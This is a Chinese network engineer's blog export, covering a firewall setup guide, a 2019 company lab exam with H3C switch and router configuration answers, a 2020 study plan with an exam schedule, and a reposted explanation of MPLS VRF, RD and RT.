<h3 id="配置远程管理"><a href="#配置远程管理" class="headerlink" title="配置远程管理"></a>配置远程管理</h3><p>最后根据我们远程管理防火墙的方式来开启对应的服务。（开放服务是根据区域来开放的，后边的控制地址这里不建议配置为any，考虑到安全，专人专管或者部门专管，这里的控制地址建议配置成一个主机IP或者一段IP，指的就是哪些IP可以进行管理防火墙）：</p>
<p><img src="/1043/8.PNG"></p>
<h3 id="配置日志"><a href="#配置日志" class="headerlink" title="配置日志"></a>配置日志</h3><p>然后我们配置日志外发功能：</p>
<p><img src="/1043/9.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>【2019年公司技术比武实操题】</title>
    <url>/1044/</url>
    <content><![CDATA[<p>惨败。</p>
<p>一切不利的结果，都是由于当事人的能力不足导致的。</p>
<p>需要学得东西还有很多很多。</p>
<p>记录一下题目，方便查阅。</p>
<span id="more"></span>

<h1 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h1><p><img src="/1044/1.PNG"></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>根据拓扑图完成下列配置：</p>
<ol>
<li>考试使用 CRT 工具记录会话，保存文件名为考生考号。</li>
<li>SW2 到 R1 之间使用光纤互联，模块及光纤跳线自选。</li>
<li>在 SW1 上创建 Vlan10，地址为 192.168.10.0&#x2F;24，网关为<br>192.168.10.252；在 SW2 上创建 Vlan10，地址为 192.168.10.0&#x2F;24，网关为<br>192.168.10.253。</li>
<li>在 SW1 上配置 DHCP 服务，使 PC1 自动获取 VLAN10 的地址，所获取地址范围<br>为 192.168.10.40—192.168.10.50。</li>
<li>SW1、SW2 之间使用 VRRP，其中 vlan10 工作在备份组 1,SW1 为 master，虚<br>拟网关地址为 192.168.10.254；设置监控 SW1 到 R1 的上行链路，如上行链<br>路中断 SW1 切换为 Backup。</li>
<li>R1 与 R2 之间采用 MPLS L3VPN，设备角色为 CPE，RD 值为 1:1，VPN 实例名<br>为 DS，将相关接口及路由协议划入该实例。</li>
<li>在 R2 上配置 Loopback 0 接口，地址为 192.168.40.1&#x2F;32。</li>
<li>SW1、SW2、R1 之间采用 RIP 协议 V2 版本，发布精确网段；R1、R2 之间采用<br>IS-IS 协议。</li>
<li>测试 PC1 与 Loopback 0 接口的连通性。</li>
<li>在 R2 上设置 Agent 使用 SNMP 协议，版本为 v3，SNMPv3 用户名为<br>admin，用户权限为 network-admin，认证算法为 SHA-1，认证密码为<br>dssc。开启 SNMP 告警功能，设置接收 SNMP 告警信息的目的主机 IP 地址为<br>8.8.8.8 ，配置安全认证参数为 admin。</li>
<li>在 R2 上配置 SSH 登录，用户名为 admin，密码为 admin，配置用户为最大权<br>  限。</li>
<li>在防火墙上配置 NAT，将 R2 上 10.126.0.13 地址的 22 端口公布在互联网区<br>  转换为 3000 端口，对外提供服务的地址为防火墙 ETH3 接口地址，设置安全<br>  策略仅允许所有互联网用户在 16 日之前（包含 16 日）登录 R2，并使用 PC2<br>  登录测试。（防火墙不得手动配置路由）。</li>
<li>在 PC1 上设置，将 windows 密码策略按如下要求进行配置：密码长度最短为<br>  8 位；口令不重复的次数为 5 次；每 3 个月修改一次密码。</li>
<li>在 PC1 上设置，通过远程桌面方式登录到本机的账号，不活动断开时间为<br>  20 分钟。</li>
<li>15.在 PC1 上设置注册表，将远程桌面登录的端口号由 3389 改为 11111。</li>
</ol>
<h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><ol>
<li><p>考试使用CRT工具记录会话，保存文件名为考生考号。</p>
</li>
<li><p>SW2到R1之间使用光纤互联，模块及光纤跳线自选。</p>
</li>
</ol>
<p><strong>SW2:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface GigabitEthernet1/0/49</span><br><span class="line"></span><br><span class="line"> port link-mode route</span><br><span class="line"></span><br><span class="line"> ip address 10.126.0.5 255.255.255.252</span><br></pre></td></tr></table></figure>


<p><strong>R1:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface GigabitEthernet2/0/3</span><br><span class="line"></span><br><span class="line">combo <span class="built_in">enable</span> fiber</span><br><span class="line"></span><br><span class="line"> ip binding vpn-instance DS</span><br><span class="line"></span><br><span class="line">​      ip address 10.126.0.6 255.255.255.252</span><br></pre></td></tr></table></figure>




<ol start="3">
<li><p>全局互联地址见拓扑图。</p>
</li>
<li><p>R1与R2之间采用三层静态链路聚合互联。</p>
</li>
</ol>
<p><strong>R1:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface Route-Aggregation1</span><br><span class="line"></span><br><span class="line">ip address 10.126.0.9 255.255.255.252</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface GigabitEthernet2/0/1</span><br><span class="line"></span><br><span class="line">port link-aggregation group 1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface GigabitEthernet2/0/2</span><br><span class="line"></span><br><span class="line">port link-aggregation group 1</span><br></pre></td></tr></table></figure>


<p><strong>R2:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface Route-Aggregation1</span><br><span class="line"></span><br><span class="line">ip address 10.126.0.9 255.255.255.252</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface GigabitEthernet2/0/1</span><br><span class="line"></span><br><span class="line">port link-aggregation group 1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface GigabitEthernet2/0/2</span><br><span class="line"></span><br><span class="line">port link-aggregation group 1</span><br></pre></td></tr></table></figure>




<ol start="5">
<li>在SW1上创建Vlan10，地址为192.168.10.0&#x2F;24，网关为192.168.10.252；在SW2上创建Vlan10，地址为192.168.10.0&#x2F;24，网关为192.168.10.253。*(5题6题配置在一起)*</li>
</ol>
<p><strong>SW1:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vlan 10</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface Vlan-interface10</span><br><span class="line"></span><br><span class="line"> ip address 192.168.10.252 255.255.255.0</span><br><span class="line"></span><br><span class="line"> vrrp vrid 1 virtual-ip 192.168.10.254</span><br><span class="line"></span><br><span class="line"> vrrp vrid 1 priority 110</span><br><span class="line"></span><br><span class="line"> vrrp vrid 1 track 1 priority reduced 20</span><br></pre></td></tr></table></figure>


<p><strong>SW2:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vlan 10</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface Vlan-interface10</span><br><span class="line"></span><br><span class="line"> ip address 192.168.10.253 255.255.255.0</span><br><span class="line"></span><br><span class="line"> vrrp vrid 1 virtual-ip 192.168.10.254</span><br></pre></td></tr></table></figure>




<ol start="6">
<li>SW1、SW2之间使用VRRP，其中vlan10工作在备份组1,SW1为master，虚拟网关地址为192.168.10.254；设置监控SW1到R1的上行链路，如上行链路中断SW1切换为Backup。</li>
</ol>
<p><strong>SW1</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">track 1 interface GigabitEthernet1/0/48</span><br></pre></td></tr></table></figure>




<ol start="7">
<li>R1与R2之间采用MPLS L3VPN，设备角色为CPE，RD值为1:1，VPN实例名为DS，将相关接口及路由协议划入该实例。</li>
</ol>
<p><strong>R1、R2：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip vpn-instance DS</span><br><span class="line"></span><br><span class="line"> route-distinguisher 1:1</span><br></pre></td></tr></table></figure>


<p>R1、R2的所有接口配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip binding vpn-instance DS</span><br></pre></td></tr></table></figure>




<ol start="8">
<li>在R2上配置Loopback 0接口，地址为192.168.40.1。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface LoopBack0</span><br><span class="line"></span><br><span class="line"> ip binding vpn-instance DS</span><br><span class="line"></span><br><span class="line"> ip address 192.168.40.1 255.255.255.255</span><br><span class="line"></span><br><span class="line"> isis <span class="built_in">enable</span> 1</span><br></pre></td></tr></table></figure>




<ol start="9">
<li>SW1、SW2、R1之间采用RIP协议V2版本，发布精确网段；R1、R2之间采用IS-IS协议。</li>
</ol>
<p><strong>SW1：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip 1</span><br><span class="line"></span><br><span class="line"> undo summary</span><br><span class="line"></span><br><span class="line"> version 2</span><br><span class="line"></span><br><span class="line"> network 10.126.0.0 255.255.255.252</span><br><span class="line"></span><br><span class="line"> network 192.168.10.0 255.255.255.0</span><br></pre></td></tr></table></figure>

<p><strong>SW2：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip 1</span><br><span class="line"></span><br><span class="line"> undo summary</span><br><span class="line"></span><br><span class="line"> version 2</span><br><span class="line"></span><br><span class="line"> network 10.126.0.4 255.255.255.252</span><br><span class="line"></span><br><span class="line"> network 192.168.10.0 255.255.255.0</span><br></pre></td></tr></table></figure>




<p><strong>R1：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip 1 vpn-instance DS</span><br><span class="line"></span><br><span class="line"> undo summary</span><br><span class="line"></span><br><span class="line"> version 2</span><br><span class="line"></span><br><span class="line"> network 10.126.0.0 0.0.0.3</span><br><span class="line"></span><br><span class="line"> network 10.126.0.4 0.0.0.3</span><br><span class="line"></span><br><span class="line"> import-route isis 1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">isis 1 vpn-instance DS</span><br><span class="line"></span><br><span class="line"> network-entity 10.0101.2600.0009.00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> address-family ipv4 unicast</span><br><span class="line"></span><br><span class="line">  import-route rip 1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface Route-Aggregation1</span><br><span class="line"></span><br><span class="line"> ip binding vpn-instance DS (第7题步骤)</span><br><span class="line"></span><br><span class="line"> ip address 10.126.0.9 255.255.255.252</span><br><span class="line"></span><br><span class="line"> isis 1 <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>


<p><strong>R2：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line">isis 1 vpn-instance DS</span><br><span class="line"></span><br><span class="line"> network-entity 10.0101.2600.0010.00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">interface Route-Aggregation1</span><br><span class="line"></span><br><span class="line"> ip binding vpn-instance DS (第7题步骤)</span><br><span class="line"></span><br><span class="line"> ip address 10.126.0.10 255.255.255.252</span><br><span class="line"></span><br><span class="line"> isis 1 <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>




<ol start="10">
<li>测试PC1与Loopback 0接口的连通性。</li>
</ol>
<p>在PC1上Ping 192.168.40.1</p>
<ol start="11">
<li>在R2 上设置Agent 使用SNMP协议，版本为v3，SNMPv3 用户名为 admin，用户权限为network-admin，认证算法为SHA-1，认证密码为dssc。开启SNMP 告警功能，设置接收SNMP告警信息的目的主机IP地址为8.8.8.8 ，配置安全认证参数为admin。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snmp-agent sys-info version v3</span><br><span class="line"></span><br><span class="line">snmp-agent usm-user v3 admin user-role network-admin simple authentication-mode sha dssc</span><br><span class="line"></span><br><span class="line">snmp-agent <span class="built_in">trap</span> <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line">snmp-agent target-host <span class="built_in">trap</span> address udp-domain 8.8.8.8 params securityname admin v3 privacy</span><br></pre></td></tr></table></figure>




<ol start="12">
<li>在R2上配置SSH登录，用户名为admin，密码为admin。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh server <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line">ssh user admin service-type stelnet authentication-type password</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">local-user admin </span><br><span class="line"></span><br><span class="line">​       password simple admin</span><br><span class="line"></span><br><span class="line">​       service-type ssh</span><br><span class="line"></span><br><span class="line"> authorization-attribute user-role network-admin</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">line vty 0 4</span><br><span class="line"></span><br><span class="line"> authentication-mode scheme</span><br></pre></td></tr></table></figure>


<ol start="13">
<li>在防火墙上配置NAT，将R2上10.126.0.13地址的22端口公布在互联网区转换为3000端口，设置安全策略仅允许所有互联网用户在16日之前（包含16日）登录R2，并使用PC2 登录测试。（防火墙不得手动配置路由）</li>
</ol>
<ol>
<li><p>ETH2、ETH3配置接口地址</p>
</li>
<li><p>创建10.126.0.13主机地址，创建防火墙ETH3接口主机</p>
</li>
<li><p>创建时间资源，创建3000端口服务资源。</p>
</li>
<li><p>目的地址转换，源地址any，目的地址是222.99.0.2，服务3000，转换为地址10.126.0.13，转换端口为22</p>
</li>
<li><p>配置访问控制，源地址any,目的地址10.126.0.13，服务any，高级选项选择创建的时间资源。</p>
</li>
</ol>
<h1 id="评分标准"><a href="#评分标准" class="headerlink" title="评分标准"></a>评分标准</h1><p><img src="/1044/2.PNG"></p>
<p><img src="/1044/3.PNG"></p>
<p><img src="/1044/4.PNG"></p>
<p><img src="/1044/5.PNG"></p>
<p><img src="/1044/6.PNG"></p>
<p><img src="/1044/7.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
      </tags>
  </entry>
  <entry>
    <title>【2020年计划】</title>
    <url>/1045/</url>
    <content><![CDATA[<p>2020年到了，希望会越来越好吧，各个方面。</p>
<p>简单写个计划，尽力实现吧，想不到的flag之后再立。</p>
<span id="more"></span>

<h1 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h1><ol>
<li>熟练<strong>华为</strong>交换机&#x2F;路由器设备配置维护。</li>
<li>学习信息网络安全，以<strong>CTF内容</strong>为主，再开一个学习笔记系列的坑。</li>
<li>完善设备巡视脚本，加点可视化和交互，能用扒出来的lldp出个拓扑最好，还得研究。</li>
</ol>
<h1 id="技能"><a href="#技能" class="headerlink" title="技能"></a>技能</h1><ol>
<li>软考，今年都考高级，上半年考高项（5.23），下半年考网设（11.7）。</li>
<li>注电发输变基础考试（10.18）。</li>
<li>n2（7.5、12.6），难，年年立flag，年年懒得学。</li>
</ol>
<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol>
<li>研究研究建个动态站，一方面科学上个网，一方面把静态博客整体迁移，向百度爬虫低头。</li>
</ol>
<h1 id="2020年度专业技术人员职业资格考试工作计划"><a href="#2020年度专业技术人员职业资格考试工作计划" class="headerlink" title="2020年度专业技术人员职业资格考试工作计划"></a>2020年度专业技术人员职业资格考试工作计划</h1><table>
<thead>
<tr>
<th>序号</th>
<th>考试名称</th>
<th></th>
<th>考试日期</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>教师资格（笔试）</td>
<td></td>
<td>3月14日</td>
</tr>
<tr>
<td>2</td>
<td>咨询工程师（投资）</td>
<td></td>
<td>4月11、12日</td>
</tr>
<tr>
<td>3</td>
<td>房地产经纪人协理、房地产经纪人</td>
<td></td>
<td>4月18、19日</td>
</tr>
<tr>
<td>4</td>
<td>会计（初级）</td>
<td></td>
<td>5月9-17日</td>
</tr>
<tr>
<td>5</td>
<td>注册建筑师</td>
<td>一级</td>
<td>5月16、17、23、24日</td>
</tr>
<tr>
<td></td>
<td></td>
<td>二级</td>
<td>5月16、17日</td>
</tr>
<tr>
<td>6</td>
<td>护士执业资格</td>
<td></td>
<td>5月16-18日</td>
</tr>
<tr>
<td>7</td>
<td>教师资格（面试）</td>
<td></td>
<td>5月16、17日</td>
</tr>
<tr>
<td>8</td>
<td>环境影响评价工程师</td>
<td></td>
<td>5月16、17日</td>
</tr>
<tr>
<td>9</td>
<td>卫生（初级、中级）</td>
<td></td>
<td>5月23、24、30、31日</td>
</tr>
<tr>
<td>10</td>
<td>计算机技术与软件（初级、中级、高级）</td>
<td></td>
<td>5月23、24日</td>
</tr>
<tr>
<td>11</td>
<td>演出经纪人员资格</td>
<td></td>
<td>5月30日</td>
</tr>
<tr>
<td>12</td>
<td>银行业专业人员职业资格（初级、中级）</td>
<td></td>
<td>6月13、14日</td>
</tr>
<tr>
<td>13</td>
<td>注册计量师（一级、二级）</td>
<td></td>
<td>6月13、14日</td>
</tr>
<tr>
<td>14</td>
<td>翻译专业资格（一、二、三级）</td>
<td></td>
<td>6月20、21日</td>
</tr>
<tr>
<td>15</td>
<td>社会工作者职业资格（初级、中级、高级）</td>
<td></td>
<td>6月20、21日</td>
</tr>
<tr>
<td>16</td>
<td>土地登记代理人</td>
<td></td>
<td>6月20、21日</td>
</tr>
<tr>
<td>17</td>
<td>注册核安全工程师</td>
<td></td>
<td>9月5、6日</td>
</tr>
<tr>
<td>18</td>
<td>注册设备监理师</td>
<td></td>
<td>9月5、6日</td>
</tr>
<tr>
<td>19</td>
<td>注册测绘师</td>
<td></td>
<td>9月5、6日</td>
</tr>
<tr>
<td>20</td>
<td>监理工程师</td>
<td></td>
<td>9月5、6日</td>
</tr>
<tr>
<td>21</td>
<td>法律职业资格（客观题）</td>
<td></td>
<td>9月5、6日</td>
</tr>
<tr>
<td>22</td>
<td>会计（中级、高级）</td>
<td></td>
<td>9月5-7日</td>
</tr>
<tr>
<td>23</td>
<td>经济（高级）</td>
<td></td>
<td>9月12日</td>
</tr>
<tr>
<td>24</td>
<td>一级建造师</td>
<td></td>
<td>9月19、20日</td>
</tr>
<tr>
<td>25</td>
<td>资产评估师</td>
<td></td>
<td>9月19、20日</td>
</tr>
<tr>
<td>26</td>
<td>出版（初级、中级）</td>
<td></td>
<td>10月11日</td>
</tr>
<tr>
<td>27</td>
<td>审计（初级、中级、高级）</td>
<td></td>
<td>10月11日</td>
</tr>
<tr>
<td>28</td>
<td>通信（初级、中级）</td>
<td></td>
<td>10月17日</td>
</tr>
<tr>
<td>29</td>
<td>法律职业资格（主观题）</td>
<td></td>
<td>10月17日</td>
</tr>
<tr>
<td>30</td>
<td>注册城乡规划师</td>
<td></td>
<td>10月17、18日</td>
</tr>
<tr>
<td>31</td>
<td>勘察设计行业</td>
<td>注册土木工程师 岩土</td>
<td>10月18日</td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册土木工程师 港口与航道工程</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册土木工程师 水利水电工程（5个专业）</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册土木工程师 道路工程</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册电气工程师（2个专业）</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册公用设备工程师（3个专业）</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册化工工程师</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册环保工程师</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册结构工程师 一级</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>注册结构工程师 二级</td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>房地产估价师</td>
<td></td>
<td>10月17、18日</td>
</tr>
<tr>
<td>33</td>
<td>拍卖师（纸笔作答）</td>
<td></td>
<td>10月17、18日</td>
</tr>
<tr>
<td>34</td>
<td>统计（初级、中级、高级）</td>
<td></td>
<td>10月18日</td>
</tr>
<tr>
<td>35</td>
<td>一级造价工程师</td>
<td></td>
<td>10月24、25日</td>
</tr>
<tr>
<td>36</td>
<td>机动车检测维修士、机动车检测维修工程师</td>
<td></td>
<td>10月24、25日</td>
</tr>
<tr>
<td>37</td>
<td>执业药师（药学、中药学）</td>
<td></td>
<td>10月24、25日</td>
</tr>
<tr>
<td>38</td>
<td>银行业专业人员职业资格（初级、中级）</td>
<td></td>
<td>10月24、25日</td>
</tr>
<tr>
<td>39</td>
<td>房地产经纪人协理、房地产经纪人</td>
<td></td>
<td>10月24、25日</td>
</tr>
<tr>
<td>40</td>
<td>广播电视编辑记者、播音员主持人</td>
<td></td>
<td>10月24、25日</td>
</tr>
<tr>
<td>41</td>
<td>经济（初级、中级）</td>
<td></td>
<td>10月31日、11月1日</td>
</tr>
<tr>
<td>42</td>
<td>一级注册消防工程师</td>
<td></td>
<td>11月7、8日</td>
</tr>
<tr>
<td>43</td>
<td>计算机技术与软件（初级、中级、高级）</td>
<td></td>
<td>11月7、8日</td>
</tr>
<tr>
<td>44</td>
<td>税务师</td>
<td></td>
<td>11月7、8日</td>
</tr>
<tr>
<td>45</td>
<td>注册验船师</td>
<td></td>
<td>11月7、8日</td>
</tr>
<tr>
<td>46</td>
<td>专利代理师</td>
<td></td>
<td>11月7、8日</td>
</tr>
<tr>
<td>47</td>
<td>资产评估师（珠宝评估专业）</td>
<td></td>
<td>11月13-15日</td>
</tr>
<tr>
<td>48</td>
<td>演出经纪人员资格</td>
<td></td>
<td>11月14日</td>
</tr>
<tr>
<td>49</td>
<td>导游资格</td>
<td></td>
<td>11月14日</td>
</tr>
<tr>
<td>50</td>
<td>拍卖师（实际操作）</td>
<td></td>
<td>11月14、15日</td>
</tr>
<tr>
<td>51</td>
<td>中级注册安全工程师</td>
<td></td>
<td>11月14、15日</td>
</tr>
<tr>
<td>52</td>
<td>翻译专业资格（一、二、三级）</td>
<td></td>
<td>11月14、15日</td>
</tr>
<tr>
<td>53</td>
<td>公路水运工程助理试验检测师、试验检测师</td>
<td></td>
<td>11月14、15日</td>
</tr>
<tr>
<td>54</td>
<td>证券业从业人员资格</td>
<td></td>
<td>3月28-29日，5月30-31日，7月11-12日，8月29-30日，11月28-29日</td>
</tr>
<tr>
<td>55</td>
<td>期货从业人员资格</td>
<td></td>
<td>1月11日，3月14日，5月16日，7月18日，9月12日，11月21日</td>
</tr>
<tr>
<td>56</td>
<td>基金从业人员资格</td>
<td></td>
<td>3月28日，5月23日，6月20日，10月24日，4月25-26日，9月19-20日，11月28-29日</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>【【转】MPLS拓扑设计与VRF、RD、RT详解】</title>
    <url>/1046/</url>
    <content><![CDATA[<p>原文出自：<a href="https://blog.csdn.net/Mr_Bei/article/details/84376319">https://blog.csdn.net/Mr_Bei/article/details/84376319</a></p>
<p>几个技术概念：</p>
<ul>
<li><p><strong>MPLS</strong>：多协议标签交换（Multi-Protocol Label Switching）</p>
</li>
<li><p><strong>VRF</strong>：虚拟路由转发（Virtual Routing Forwarding）</p>
</li>
<li><p><strong>RD</strong>：路由区分器（route distinguishers ）</p>
</li>
<li><p><strong>RT</strong>：路由标记（route-target）</p>
</li>
</ul>
<span id="more"></span>

<h1 id="拓扑示例"><a href="#拓扑示例" class="headerlink" title="拓扑示例"></a>拓扑示例</h1><p><img src="/1046/1.PNG"></p>
<h1 id="拓扑需求"><a href="#拓扑需求" class="headerlink" title="拓扑需求"></a>拓扑需求</h1><p>在MPLS网络中，实现：</p>
<ol>
<li><p>CE1的loopback0 ping通CE3的lookback0，不能ping通CE4</p>
</li>
<li><p>CE2的lookback0 ping通CE4的lookback0，不能ping通CE3</p>
</li>
</ol>
<h1 id="拓扑难点"><a href="#拓扑难点" class="headerlink" title="拓扑难点"></a>拓扑难点</h1><ol>
<li><p>CE1和CE2的lookback0的地址都是192.168.1.1，如何实现隔离</p>
</li>
<li><p>CE3发送的数据包都过MPLS网络到达PE1，PE1如何实现将数据包转发给CE1，而不转发给CE2</p>
</li>
<li><p>CE4发送的数据包都过MPLS网络到达PE2，PE1如何实现将数据包转发给CE2，而不转发给CE1</p>
</li>
</ol>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><h2 id="VRF——VPN路由转发实例（VPN-Routing-amp-Forwarding-Instance）"><a href="#VRF——VPN路由转发实例（VPN-Routing-amp-Forwarding-Instance）" class="headerlink" title="VRF——VPN路由转发实例（VPN Routing &amp; Forwarding Instance）"></a>VRF——VPN路由转发实例（VPN Routing &amp; Forwarding Instance）</h2><p>解决难点一：CE1和CE2的lookback0的地址都是192.168.1.1，<strong>使用VRF实现隔离</strong>。</p>
<p>作用：<strong>对LAN进行隔离</strong>，解决用户安全</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">命令解释：以PE1为例</span><br><span class="line">ip vrf A      //创建一个VRF 名为A</span><br><span class="line">ip vrf B      //创建一个VRF 名为B</span><br><span class="line">int f0/0      //进入接口f0/0调用VRF A</span><br><span class="line">    ip vrf forwarding A     //在f0/0接口调用VRF A</span><br><span class="line">int f1/0      //进入接口f1/0调用VRF B</span><br><span class="line">    ip vrf forwarding B      //在f1/0接口调用VRF B</span><br></pre></td></tr></table></figure>

<p><strong>思路解析</strong>：不同VRF之间相互隔离不通信，将PE1的f0&#x2F;0接口划分进vrf A，PE1的f1&#x2F;0接口划分进vrf B，这样CE1和CE2就被划分进不同的VRF中，他们之间无法通信，便实现了LAN之间的隔离。</p>
<h2 id="RD——路由区分器（route-distinguishers-）"><a href="#RD——路由区分器（route-distinguishers-）" class="headerlink" title="RD——路由区分器（route distinguishers ）"></a>RD——路由区分器（route distinguishers ）</h2><p>解决难点二：CE3发送的数据包都过MPLS网络到达PE1，PE1如何实现将数据包转发给CE1，而不转发给CE2；CE4发送的数据包都过MPLS网络到达PE2，PE1如何实现将数据包转发给CE2，而不转发给CE1，<strong>使用RD解决冲突</strong>。</p>
<p>作用：给客户端<strong>ipv4地址</strong>附加一个<strong>64bit的RD</strong>，使它们的地址不重叠，使得它变成全球唯一的地址，附加RD后的地址即是<strong>VPNv4</strong>地址。</p>
<p><em>附：能够支持IPv4地址外的地址族的BGP协议被称为multiprotocol BGP (MPBGP)。</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">命令解释：以PE1为例</span><br><span class="line">ip vrf A</span><br><span class="line">  rd 1:1        //为VRF A部署RD为1:1</span><br><span class="line">ip vrf B</span><br><span class="line">  rd 2:2         //为VRF B部署RD为2:2</span><br><span class="line">int f0/0      //进入接口f0/0调用VRF A</span><br><span class="line">    ip vrf forwarding A     //在f0/0接口调用VRF A</span><br><span class="line">int f1/0      //进入接口f1/0调用VRF B</span><br><span class="line">    ip vrf forwarding B      //在f1/0接口调用VRF B</span><br></pre></td></tr></table></figure>

<p><strong>思路解析</strong>：在VRF A的进程下，部署一个RD如1:1，当CE1的loopback0发送数据包达到PE1，192.168.1.1地址便会附加上RD为1:1这个团体属性，然后作为VPNv4地址，PE1与之间PE2转发的数据包地址便是1:1 192.168.1.1；</p>
<p>在VRF B的进程下，部署一个RD如2:2，当CE2的loopback0发送数据包达到PE1，192.168.1.1地址便会附加上RD为2:2这个团体属性，然后作为VPNv4地址，PE1与之间PE2转发的数据包地址便是2:2 192.168.1.1；</p>
<p>若PE1收到数据包，想转发给1:1 192.168.1.1，数据包便从f0&#x2F;0口发出，</p>
<p>若PE1收到数据包，想转发给2:2 192.168.1.1，数据包便从f1&#x2F;0口发出。</p>
<h2 id="RT——路由标记（route-target）"><a href="#RT——路由标记（route-target）" class="headerlink" title="RT——路由标记（route-target）"></a>RT——路由标记（route-target）</h2><p>解决难点三：在MPLS网络，CE1或CE2发送的数据包到达PE1后，PE如1何实现将数据包转发给PE2，<strong>使用RT实现对接</strong>。</p>
<p>作用：实现路由的导入和导出，让发送路由的PE知道发给哪些VPN客户，让接收路由的PE知道要把路由导入哪些VRF。</p>
<p>RT是一个扩展的BGP的团体属性，VPNV4路由在传递时是要带上这个属性。</p>
<p>RT值有两个，一个是export 导出RT，一个是import 导入RT。</p>
<p><strong>发送端PE的export必须和接收端PE的import对应</strong>，只有对应上，接收端PE才会把vpnv4路由加入VRF路由表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">命令解释：</span><br><span class="line"></span><br><span class="line">在PE1部署：</span><br><span class="line">ip vrf A</span><br><span class="line">  rd 1:1        //为VRF A部署RD为1:1</span><br><span class="line">   route-target 10:1 //为VRF A部署RT的<span class="built_in">export</span>和import都为10:1</span><br><span class="line">ip vrf B</span><br><span class="line">  rd 2:2        //为VRF B部署RD为2:2</span><br><span class="line">   route-target 10:2 //为VRF B部署RT的<span class="built_in">export</span>和import都为10:2</span><br><span class="line">int f0/0      //进入接口f0/0调用VRF A</span><br><span class="line">    ip vrf forwarding A     //在f0/0接口调用VRF A</span><br><span class="line">int f1/0      //进入接口f1/0调用VRF B</span><br><span class="line">    ip vrf forwarding B      //在f1/0接口调用VRF B</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">在PE2部署：</span><br><span class="line">ip vrf C</span><br><span class="line">  rd 3:3        //为VRF C部署RD为3:3</span><br><span class="line">   route-target 10:1 //为VRF C部署RT的<span class="built_in">export</span>和import都为10:1</span><br><span class="line">ip vrf D</span><br><span class="line">  rd 4:4        //为VRF D部署RD为4:4</span><br><span class="line">   route-target 10:2 //为VRF D部署RT的<span class="built_in">export</span>和import都为10:2</span><br><span class="line">int f1/0      //进入接口f1/0调用VRF C</span><br><span class="line">    ip vrf forwarding C     //在f1/0接口调用VRF C</span><br><span class="line">int f2/0      //进入接口f2/0调用VRF D</span><br><span class="line">    ip vrf forwarding D     //在f2/0接口调用VRF D</span><br></pre></td></tr></table></figure>

